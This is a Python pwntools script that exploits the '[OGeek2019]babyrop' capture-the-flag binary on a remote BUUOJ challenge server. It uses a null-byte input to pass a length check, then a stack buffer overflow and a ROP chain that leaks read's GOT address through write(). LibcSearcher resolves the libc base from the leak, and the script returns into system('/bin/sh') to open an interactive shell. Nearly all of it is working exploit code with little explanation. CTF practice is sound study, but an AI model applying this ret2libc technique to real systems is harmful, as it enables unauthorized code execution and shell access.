from pwn import *
from LibcSearcher import *
#p=process("./pwn01")
p=remote("node4.buuoj.cn",29919)
elf=ELF("./[OGeek2019]babyrop")

payload1='\x00'+7*'\xFF'         #\xff就是v5
p.sendline(payload1)
p.recv()
write_plt=elf.plt["write"]
read_got=elf.got["read"]
main_addr=0x08048825
payload2=b"A"*(0xe7+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(8) #main_addr作为返回地址，构造write（1,read_got,8）
                                          
p.sendline(payload2)

read_addr=u32(p.recv(4))

print(hex(read_addr))
libc=LibcSearcher('read',read_addr)
base=read_addr-libc.dump("read")
system_addr=base+libc.dump("system")
str_bin_sh= base+libc.dump("str_bin_sh")
p.sendline(payload1)

payload3=b"A"*(0xe7+4)+p32(system_addr)+p32(1)+p32(str_bin_sh)

p.sendline(payload3)

p.interactive()
